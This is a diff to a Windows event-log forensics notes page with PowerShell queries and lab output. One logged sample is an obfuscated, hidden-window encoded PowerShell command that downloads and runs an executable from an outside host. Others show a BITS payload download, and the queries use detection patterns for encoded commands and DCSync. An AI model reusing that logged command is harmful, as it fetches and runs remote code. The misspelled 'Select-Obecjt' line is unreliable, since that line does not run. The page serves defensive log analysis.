@@ -36,11 +36,14 @@ permalink: /sys/win/logs
 	* [activate-firewall-logs-managed](#activate-firewall-logs-managed)
  	* [tampering-logs](#tampering-logs) 
 * [network](#network)
-	* [net-share](#net-share)
+  	* [firewall](#firewall)	
+	* [net-bits](#net-bits)	
 	* [net-rdp](#net-rdp)
+	* [net-share](#net-share)
 	* [net-smb](#net-smb)
    	* [net-winrm](#net-winrm)
 	* [sysmon](#sysmon)
+	* [vpn-anyconnect](#vpn-anyconnect)
 * [ad](#ad)
 	* [ad-abuse-of-delegation](#ad-abuse-of-delegation)
 	* [ad-ds-replication](#ad-ds-replication)
@@ -172,7 +175,54 @@ Client = $event.UserData.EventXML.Param3
 ```
 
 ### <a name='accountchanges'></a>account-changes
+
+![windows_account_changes](/assets/images/sys-win-logs-account-changes.png)
+![windows_group_changes](/assets/images/sys-win-logs-account-changes-groups.png)
+
 ```powershell
+# 4720 | account created
+Get-WinEvent -FilterHashtable @{ LogName='Security'; ID=4720 }  | Format-List -Property TimeCreated, Message
+
+
+TimeCreated : 7/13/2022 11:08:48 AM
+Message     : A user account was created.
+
+              Subject:
+                Security ID:            S-1-5-21-2977773840-2930198165-1551093962-1000
+                Account Name:           Sec504
+                Account Domain:         SEC504STUDENT
+                Logon ID:               0x74530
+
+              New Account:
+                Security ID:            S-1-5-21-2977773840-2930198165-1551093962-1315
+                Account Name:           assetmgr
+                Account Domain:         SEC504STUDENT
+
+              Attributes:
+                SAM Account Name:       assetmgr
+                Display Name:           <value not set>
+                User Principal Name:    -
+                Home Directory:         <value not set>
+                Home Drive:             <value not set>
+                Script Path:            <value not set>
+                Profile Path:           <value not set>
+                User Workstations:      <value not set>
+                Password Last Set:      <never>
+                Account Expires:                <never>
+                Primary Group ID:       513
+                Allowed To Delegate To: -
+                Old UAC Value:          0x0
+                New UAC Value:          0x15
+                User Account Control:
+                        Account Disabled
+                        'Password Not Required' - Enabled
+                        'Normal Account' - Enabled
+                User Parameters:        <value not set>
+                SID History:            -
+                Logon Hours:            All
+
+              Additional Information:
+                Privileges              -
 ```
 
 ## <a name='executions'></a>executions
@@ -234,6 +284,21 @@ $secevt | Foreach-Object {
 
 ### <a name='powershell'></a>powershell
 ```powershell
+# base64 encoded commands 
+Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-PowerShell/Operational'; Id='4104';} | Where-object -Property Message -Match "[A-Za-z0-9+/=]{200}" | Format-List -Property Message
+
+Message : Creating Scriptblock text (1 of 1):
+          poWERShElL.Exe -ExECutioNPolicy bYpAsS -NOPrOFiLe -WindOwsTyLe HiddEN -enCodEdCoMMANd IAAoAG4ARQB3AC0AbwBiAGoAZQB
+          jAFQAIABTAHkAUwBUAGUAbQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAKQAuAEQAbwB3AE4ATABvAGEARABGAEkAbABFACgAIAAdIGgAdAB0
+          AHAAcwA6AC8ALwBhAHIAaQBoAGEAbgB0AHQAcgBhAGQAZQByAHMAbgBnAHAALgBjAG8AbQAvAGkAbQBhAGcAZQBzAC8AUwBjAGEAbgBfADIALgBlA
+          HgAZQAdICAALAAgAB0gJABlAG4AdgA6AFQARQBtAFAAXABvAHUAdABwAHUAdAAuAGUAeABlAB0gIAApACAAOwAgAGkAbgBWAG8AawBFAC0ARQB4AF
+          AAUgBlAHMAUwBJAG8ATgAgAB0gJABFAE4AdgA6AHQARQBNAFAAXABvAHUAdABwAHUAdAAuAGUAeABlAB0g
+
+          ScriptBlock ID: 9998ff14-4851-45e4-8aca-8b08753a2f42
+          Path:
+
+# catch PowerView 
+Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-PowerShell/Operational'; Id='4104';} | Where-object -Property Message -Match "dcsync" | Select-Obecjt -First 1 | FL *
 ```
 
 ### <a name='scheduled-tasks'></a>scheduled-tasks
@@ -245,6 +310,16 @@ $secevt | Foreach-Object {
 ![winevent_services](/assets/images/win_20_audit_events5_svcs.jpg)
 
 ```powershell
+Get-WinEvent -FilterHashtable @{ LogName='System'; Id='7045';} | Format-List TimeCreated,Message
+
+TimeCreated : 7/12/2022 12:36:06 PM
+Message     : A service was installed in the system.
+
+              Service Name:  Dynamics
+              Service File Name:  C:\Tools\nssm.exe
+              Service Type:  user mode service
+              Service Start Type:  auto start
+              Service Account:  LocalSystem
 ```
 
 ### <a name='sysmon'></a>sysmon
@@ -371,11 +446,51 @@ Message     : The audit log was cleared.
 ![windows log for network connections](/assets/images/for-win-logs-net-conn-1.png)
 ![windows log for network connections](/assets/images/for-win-logs-net-conn-2.png)
 
+### <a name='firewall'></a>firewall
 ```powershell
-# cisco anyconnect
-Get-WinEvent -FilterHashtable @{'Logname'='Cisco AnyConnect Secure Mobility Client'} | Group-Object Id -NoElement | sort count
-```
+Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Windows Firewall With Advanced Security/Firewall'; Id=2004,2006 } | Format-List
 
+TimeCreated  : 7/13/2022 12:46:11 AM
+ProviderName : Microsoft-Windows-Windows Firewall With Advanced Security
+Id           : 2004
+Message      : A rule has been added to the Windows Defender Firewall exception list.
+
+               Added Rule:
+                Rule ID:        {832669FD-1FAF-426C-872F-8E2B4E41AB2F}
+                Rule Name:      ApacheBench command line utility
+                Origin: Local
+                Active: No
+                Direction:      Inbound
+                Profiles:       Domain
+                Action: Allow
+                Application Path:       C:\Tools\calcache.exe
+                Service Name:
+                Protocol:       UDP
+                Security Options:       None
+                Edge Traversal: None
+                Modifying User: S-1-5-21-2977773840-2930198165-1551093962-1000
+                Modifying Application:  C:\Windows\System32\dllhost.exe
+```
+		
+### <a name='net-bits'></a>net-bits
+```powershell
+Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Bits-Client/Operational'; Id='59'} | Format-List TimeCreated,Message
+
+
+TimeCreated : 7/13/2022 1:18:15 AM
+Message     : BITS started the C:\Users\Sec504\AppData\Local\Temp\{B3C27651-579B-455E-8B0D-4441DBAECA2C}-103.0.5060.114_102
+              .0.5005.115_chrome_updater.exe transfer job that is associated with the http://edgedl.me.gvt1.com/edgedl/rele
+              ase2/chrome/acd5g6744td43h2xionzuaxlaheq_103.0.5060.114/103.0.5060.114_102.0.5005.115_chrome_updater.exe URL.
+
+TimeCreated : 7/13/2022 1:15:59 AM
+Message     : BITS started the BITS Transfer transfer job that is associated with the
+              https://www.willhackforsushi.com/bitfit.exe URL.
+
+TimeCreated : 7/13/2022 1:15:44 AM
+Message     : BITS started the Font Download transfer job that is associated with the
+              https://fs.microsoft.com/fs/windows/config.json URL.
+```
+ 
 ### <a name='net-rdp'></a>net-rdp
 ```powershell
 ```
@@ -396,6 +511,12 @@ Get-WinEvent -FilterHashtable @{'Logname'='Cisco AnyConnect Secure Mobility Clie
 
 ### <a name='sysmon'></a>sysmon
 ```powershell
+```
+
+### <a name='vpn-anyconnect'></a>vpn-anyconnect
+```powershell
+# cisco anyconnect
+Get-WinEvent -FilterHashtable @{'Logname'='Cisco AnyConnect Secure Mobility Client'} | Group-Object Id -NoElement | sort count
 ```
 
 ## <a name='ad'></a>ad
